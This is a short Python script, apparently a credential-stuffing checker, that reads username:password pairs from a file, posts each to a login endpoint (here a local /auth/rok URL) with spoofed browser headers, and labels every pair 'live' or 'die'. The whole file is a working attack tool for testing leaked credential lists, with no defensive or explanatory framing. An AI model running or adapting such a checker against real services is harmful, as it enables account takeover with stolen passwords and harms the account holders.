import requests
import sys
import json

try:
    db = sys.argv[1]
    dl = sys.argv[2]
except Exception:
    db = "db.txt"
    dl = ":"

f = open(db, 'r').readlines()

for i in range(len(f)):
    username = f[i].split()[0].split(dl)[0]
    password = f[i].split()[0].split(dl)[1]

    url = "http://127.0.0.1:5000/auth/rok"

    headers = {
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "origin": "http://127.0.0.1:5000",
        "referer": "http://127.0.0.1:5000/",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
    }

    data = json.dumps({"username": username, "password": password})

    r = requests.post(url, headers=headers, data=data, allow_redirects=False)

    if r.status_code == 200:
        print(f"live {username}|{password}")
    else:
        print(f"die {username}|{password}")
